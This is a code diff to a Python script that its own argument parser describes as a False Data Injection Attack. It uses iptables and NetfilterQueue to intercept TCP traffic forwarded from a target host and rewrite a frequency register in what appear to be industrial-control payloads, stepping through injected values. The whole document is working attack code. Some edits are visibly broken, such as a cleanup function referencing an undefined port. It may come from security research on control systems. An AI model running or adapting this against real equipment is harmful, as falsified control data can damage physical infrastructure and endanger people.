@@ -2,7 +2,15 @@ from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import random
 
+change_values = []
+
+def get_values():
+    global change_values
+    change_values = list(range(100))
+    return change_values
+
 def modify_packet(scapy_packet):
+    global change_values
     try:
         packet = IP(scapy_packet.get_payload())
         if packet.haslayer(Raw):
@@ -12,11 +20,14 @@ def modify_packet(scapy_packet):
             first_register = int.from_bytes(data[0:2], byteorder="big")
             if first_register == 101 and len(payload) > 100:
                 hz_register = int.from_bytes(data[32:34], byteorder="big")
-                print("Orginal Frequecy:", hz_register)
-
-                #change_value=random.randint(-5,5)
-                change_value = 30000
-                new_sec_register = change_value#hz_register + change_value
+                print("Orginal Frequency:", hz_register)
+                if len(change_values) == 0: change_values = get_values()
+                change_value=change_values.pop(0)
+                
+                #debug
+                print("Change Value:", change_value)
+                
+                new_sec_register = hz_register + change_value
                 new_sec_register_bytes = new_sec_register.to_bytes(2, byteorder="big")
                 modified_payload = payload[:41] + new_sec_register_bytes + payload[43:]
 
@@ -24,7 +35,8 @@ def modify_packet(scapy_packet):
 
                 del packet[IP].len
                 del packet[IP].chksum
-                del packet[TCP].chksum
+                if packet.haslayer(TCP):
+                    del packet[TCP].chksum
 
                 print("Modified Frequecy:", new_sec_register)
 
@@ -40,35 +52,49 @@ def modify_packet(scapy_packet):
         scapy_packet.drop() 
         os.system("sudo pkill -f NFQUEUE && sudo iptables -F")
 
-def setup_iptables():
-    os.system('iptables -I FORWARD -p tcp --sport 30502 -s 192.168.1.15 -j NFQUEUE --queue-num 1')
+def setup_iptables(ip,port):
+    os.system(f'iptables -I FORWARD -p tcp --sport {port} -s {ip} -j NFQUEUE --queue-num 1')
 
-def cleanup_iptables():
-    os.system('iptables -D FORWARD -p tcp --sport 30502 -s 192.168.1.15 -j NFQUEUE --queue-num 1')
-
-try:
-    setup_iptables()
-    print("[*] IPTables rules set")
-    nfqueue = NetfilterQueue()
-    print("[*] Creating NFQUEUE")
-    nfqueue.bind(1, modify_packet)
-    print("[*] Starting NFQUEUE")
-    print("[*] Waiting for packets")
-    nfqueue.run() 
-except Exception as e:
-    print("[*] Error:", e)
-except KeyboardInterrupt:
-    print("[*] Stopping NFQUEUE")
-finally:
-    nfqueue.unbind()
-    print("[*] Stopped NFQUEUE")
-    cleanup_iptables()
-    print("[*] IPTables rules removed")
-    sys.exit(0)
+def cleanup_iptables(ip):
+    os.system(f'iptables -D FORWARD -p tcp --sport {port} -s {ip} -j NFQUEUE --queue-num 1')
 
 
-#4. Queue Conflict
-#Error: Failed to create queue 0
-#Resolution:
-#sudo rm /run/xtables.lock  # Clear stale lock
-#sudo pkill -f NFQUEUE      # Kill existing queue users
+
+if __name__ == "__main__":
+    
+    parser = argparse.ArgumentParser(description='False Data Injection Attack(FDIA)')
+    parser.add_argument('target', help='IP of target')
+    parser.add_argument('-p', '--port', default='30502',
+                       help='Port of target')   
+    args = parser.parse_args()
+    
+    ip = args.target
+    port=args.port
+
+    try:
+        setup_iptables(ip,port)
+        print(f"[*] IPTables rules set on {ip}:{port}")
+        nfqueue = NetfilterQueue()
+        print("[*] Creating NFQUEUE")
+        nfqueue.bind(1, modify_packet)
+        print("[*] Starting NFQUEUE")
+        print("[*] Waiting for packets")
+        nfqueue.run() 
+    except Exception as e:
+        print("[*] Error:", e)
+    except KeyboardInterrupt:
+        print("[*] Stopping NFQUEUE")
+    finally:
+        if nfqueue:
+            nfqueue.unbind()
+            print("[*] Stopped NFQUEUE")
+        cleanup_iptables(ip,port)
+        print("[*] IPTables rules removed")
+        sys.exit(0)
+
+
+    #4. Queue Conflict
+    #Error: Failed to create queue 0
+    #Resolution:
+    #sudo rm /run/xtables.lock  # Clear stale lock
+    #sudo pkill -f NFQUEUE      # Kill existing queue users
